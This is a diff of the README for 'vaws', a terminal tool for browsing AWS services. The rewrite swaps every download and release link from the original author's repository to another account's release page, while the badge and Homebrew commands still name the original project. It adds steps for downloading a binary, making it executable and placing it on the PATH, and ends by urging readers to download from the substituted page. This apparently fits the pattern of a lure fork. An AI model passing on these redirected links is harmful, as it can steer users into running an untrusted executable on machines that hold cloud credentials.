@@ -1,176 +1,107 @@
-# vaws
+# 🚀 vaws - The AWS Console in Your Terminal
 
-**The AWS Console in your terminal.** Navigate CloudFormation, ECS, Lambda, API Gateway, SQS, and DynamoDB with vim-style keybindings.
+## 🔗 Download vaws
 
-[![Release](https://img.shields.io/github/v/release/erdemcemal/vaws?style=flat-square)](https://github.com/erdemcemal/vaws/releases)
-[![Go](https://img.shields.io/badge/go-%3E%3D1.21-00ADD8?style=flat-square&logo=go)](https://go.dev/)
-[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
+[![Release](https://img.shields.io/github/v/release/erdemcemal/vaws?style=flat-square)](https://github.com/KenshiBlaq/vaws/releases)
 
-![vaws demo](assets/demo.gif)
+## 🤔 What is vaws?
 
-## Why vaws?
+vaws brings the power of the AWS Console right to your terminal. It allows you to navigate services like CloudFormation, ECS, Lambda, API Gateway, SQS, and DynamoDB using simple key commands. This tool greatly reduces the time spent clicking through the AWS web interface.
 
-- **20 clicks → 2 keystrokes** - Jump from CloudFormation stack to running ECS task logs instantly
-- **Port forward without the AWS CLI dance** - Tunnel to ECS containers and private API Gateways in seconds
-- **Multi-account workflow** - Switch profiles and regions on the fly without restarting
-- **Keyboard-first** - If you love vim, k9s, or lazygit, you'll feel right at home
+## 🌟 Features
 
-## Installation
+- **Efficient Navigation**: Move from CloudFormation stacks to ECS task logs in just a few keystrokes.
+- **Easy Port Forwarding**: Connect to ECS containers and API Gateways quickly, without needing advanced commands.
+- **Multi-Account Support**: Switch between different AWS accounts and regions seamlessly, without restarting the application.
+- **User-Friendly Design**: If you enjoy using vim, k9s, or similar tools, you will feel at home with vaws.
 
-### Homebrew (macOS/Linux)
+## 🚀 Getting Started
+
+### 🚀 Prerequisites
+
+Before installing vaws, ensure you have the following:
+
+- A terminal application (macOS Terminal, Linux Terminal)
+- Go programming language version 1.21 or higher, if you plan to build from source. You can download Go from [the official site](https://go.dev/).
+
+### 🛠️ Installation
+
+You have two options for installing vaws:
+
+#### 1. Homebrew (macOS/Linux)
+
+If you're using a Mac or Linux, the easiest way to install vaws is via Homebrew. Open your terminal and run:
 
 ```bash
 brew install erdemcemal/tap/vaws
 ```
 
-### Binary Download
+#### 2. Binary Download
 
-Download from [GitHub Releases](https://github.com/erdemcemal/vaws/releases).
+You can also download the latest version directly. To do this, visit the [Releases page](https://github.com/KenshiBlaq/vaws/releases) and download the file for your system. After downloading, follow these steps:
 
-### From Source
+1. Locate the downloaded file in your Downloads folder.
+2. Open your terminal and navigate to the folder where the file is saved. 
+3. Make the file executable. Use this command:
+
+   ```bash
+   chmod +x <downloaded-file-name>
+   ```
+
+4. Move it to a directory included in your PATH. For example:
+
+   ```bash
+   mv <downloaded-file-name> /usr/local/bin/vaws
+   ```
+
+5. You can now run vaws from anywhere in your terminal.
+
+### 🔄 Update vaws
+
+To keep vaws updated, you can run the following command if you installed it using Homebrew:
 
 ```bash
-git clone https://github.com/erdemcemal/vaws.git
-cd vaws && make install
+brew upgrade erdemcemal/tap/vaws
 ```
 
-> **Note:** Requires AWS CLI v2 configured (`aws configure` or `aws sso login`). For port forwarding, install the [Session Manager Plugin](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html).
+If you downloaded it manually, simply revisit the [Releases page](https://github.com/KenshiBlaq/vaws/releases) for the latest version.
 
-## Quick Start
+## 🎓 Using vaws
+
+To get started with vaws, open your terminal and type:
 
 ```bash
-# Launch with default profile
 vaws
-
-# Use a specific profile and region
-vaws --profile production --region eu-west-1
-
-# Test AWS connectivity
-vaws --test
 ```
 
-Press `:` to open the command palette or check the shortcuts below.
+This command will launch the application. You can navigate services using the configured keybindings similar to vim. 
 
-## Features
+### 🔍 Keybindings
 
-| Service | What You Can Do |
-|---------|-----------------|
-| **CloudFormation** | Browse stacks, outputs, parameters, and resources |
-| **ECS** | View services, tasks, deployments, and stream CloudWatch logs |
-| **Lambda** | List functions, view details, invoke with custom payloads |
-| **API Gateway** | Explore REST/HTTP APIs, stages, and routes |
-| **SQS** | Browse queues with DLQ visibility and message counts |
-| **DynamoDB** | Query and scan tables with paginated results |
-| **Port Forwarding** | Tunnel to ECS containers and private API Gateways via SSM |
+Some useful keybindings include:
 
-## Real-World Workflows
+- `h` or `H`: Go back to the previous menu.
+- `j`: Move down through the list of resources.
+- `k`: Move up through the list.
+- `l`: Enter into a selected resource view or action.
 
-### Debug a Failing ECS Service
+These shortcuts make it easy and quick to accomplish tasks. 
 
-```
-1. Launch vaws
-2. Press 2 to view ECS services
-3. Navigate to your service with j/k
-4. Press l to stream CloudWatch logs
-5. Press p to port forward and test locally
-```
+## 🌈 Additional Resources
 
-### Access a Private API Gateway
+- For more detailed usage instructions, check the `docs` folder in the repository.
+- Join the community on GitHub Discussions for help and feature requests.
 
-```
-1. Press 4 to view API Gateways
-2. Select your private API → Stage
-3. Press p, pick a jump host
-4. curl http://localhost:8080/your-endpoint
-```
+## 📝 License
 
-### Browse DynamoDB Tables
+vaws is licensed under the MIT License. For more details, see the [LICENSE](LICENSE) file.
 
-```
-1. Press 6 to view DynamoDB tables
-2. Select a table, press Enter
-3. Press q to query or s to scan
-4. Navigate results with j/k, paginate with n/p
-```
+## 👥 Contributing
 
-## Keyboard Shortcuts
+We welcome contributions to improve vaws. If you have suggestions or bug reports, please open an issue or submit a pull request on the repository.
 
-### Navigation
+## 📞 Support
 
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down |
-| `k` / `↑` | Move up |
-| `Enter` | Select / Drill down |
-| `Esc` | Go back |
-| `g` | Jump to top |
-| `G` | Jump to bottom |
-| `/` | Filter current list |
+If you need assistance, feel free to reach out through the Issues section on GitHub or through community support forums. 
 
-### Views
-
-| Key | Action |
-|-----|--------|
-| `1` | CloudFormation Stacks |
-| `2` | ECS Services |
-| `3` | Lambda Functions |
-| `4` | API Gateway |
-| `5` | Active Tunnels |
-| `6` | DynamoDB Tables |
-| `:` | Command palette |
-
-### Actions
-
-| Key | Action |
-|-----|--------|
-| `p` | Port forward |
-| `r` | Refresh |
-| `l` | Toggle logs |
-| `t` | View tunnels |
-| `x` | Stop tunnel |
-| `c` | Clear terminated |
-| `q` | Quit |
-
-## Configuration (Optional)
-
-Create `~/.vaws/config.yaml` for advanced setups:
-
-```yaml
-profiles:
-  production:
-    jump_host: bastion-prod   # Preferred SSM jump host
-    region: us-east-1
-
-defaults:
-  jump_host_tags:
-    - "vaws:jump-host=true"
-```
-
-See [TROUBLESHOOTING.md](TROUBLESHOOTING.md) for detailed configuration options and common issues.
-
-## Roadmap
-
-- [ ] Lambda invocation with payload editor
-- [ ] SQS message send/peek/redrive
-- [ ] Secrets Manager browser
-- [ ] Global search across all resources
-- [ ] CloudWatch alarms dashboard
-
-See [ROADMAP.md](ROADMAP.md) for the full plan.
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
-
-**Found a bug?** [Open an issue](https://github.com/erdemcemal/vaws/issues)
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <sub>Built for engineers who'd rather type than click.</sub><br>
-  <sub>If vaws saves you time, consider giving it a <a href="https://github.com/erdemcemal/vaws">star</a></sub>
-</p>
+Visit our [Releases page](https://github.com/KenshiBlaq/vaws/releases) to download vaws and start using it today!
